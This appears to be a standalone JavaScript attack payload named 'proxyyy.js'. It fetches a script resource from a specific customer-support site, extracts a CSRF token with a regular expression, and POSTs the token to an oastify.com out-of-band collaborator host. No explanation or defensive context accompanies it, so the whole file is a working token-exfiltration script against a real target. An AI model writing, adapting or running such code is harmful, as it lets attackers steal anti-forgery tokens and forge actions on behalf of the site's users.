// proxyyy.js

fetch('https://supportcases.ctfs.com/mwsupport/auraFW/javascript/aura_prod.js.map?sf_js_last_mod=1708507544491')
    .then(response => response.text())
    .then(scriptContent => {
        // Extract the CSRF token from the script content
        var csrfToken = extractCsrfToken(scriptContent);

        // Send the CSRF token to your server
        sendCsrfToken(csrfToken);
    })
    .catch(error => {
        console.error('Error fetching script:', error);
    });

function extractCsrfToken(scriptContent) {
    // Use the same regular expression pattern as before to extract the CSRF token
    var tokenPattern = /window\.PreferenceBits\.prototype\.csrfToken\s*=\s*'([^']+)'/;
    var match = scriptContent.match(tokenPattern);
    if (match && match.length > 1) {
        return match[1];
    } else {
        console.error('CSRF token not found in script content.');
        return null;
    }
}

function sendCsrfToken(token) {
    // Send the CSRF token to your server using an HTTP request
    fetch('https://em4p5ieatfpqhj4hd61u40tzdqjh79vy.oastify.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ token: token })
    })
    .then(response => {
        if (response.ok) {
            console.log('CSRF token sent successfully.');
        } else {
            console.error('Failed to send CSRF token:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Error sending CSRF token:', error);
    });
}

